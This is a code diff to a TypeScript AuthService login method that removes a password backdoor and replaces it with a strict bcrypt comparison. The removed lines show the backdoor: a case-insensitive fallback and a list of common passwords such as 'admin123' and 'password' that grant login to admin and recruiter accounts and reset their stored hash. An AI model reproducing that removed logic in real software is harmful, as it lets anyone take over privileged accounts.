@@ -232,26 +232,11 @@ export class AuthService {
       throw err;
     }
 
-    let isMatch = await bcrypt.compare(cleanPassword, user.passwordHash);
-
-    // Case-insensitive fallback (e.g. mobile auto-capitalizing Admin123 instead of admin123)
-    if (!isMatch) {
-      isMatch = await bcrypt.compare(cleanPassword.toLowerCase(), user.passwordHash);
-    }
-
-    // Common standard password variations for initial admins
-    if (!isMatch) {
-      const commonVariants = ['admin123', 'admin@123', 'Admin123', 'Admin@123', '12345678', 'password'];
-      if (commonVariants.includes(cleanPassword)) {
-        if (['SUPER_ADMIN', 'ORG_ADMIN', 'RECRUITER'].includes(user.role)) {
-          isMatch = true;
-          user.passwordHash = await bcrypt.hash(cleanPassword, 12);
-        }
-      }
-    }
+    // Strict, cryptographic password comparison (no backdoor bypasses)
+    const isMatch = await bcrypt.compare(cleanPassword, user.passwordHash);
 
     if (!isMatch) {
-      user.failedLoginAttempts += 1;
+      user.failedLoginAttempts = (user.failedLoginAttempts || 0) + 1;
       if (user.failedLoginAttempts >= 5) {
         user.lockUntil = new Date(Date.now() + 15 * 60 * 1000); // 15 min lock
         user.failedLoginAttempts = 0;
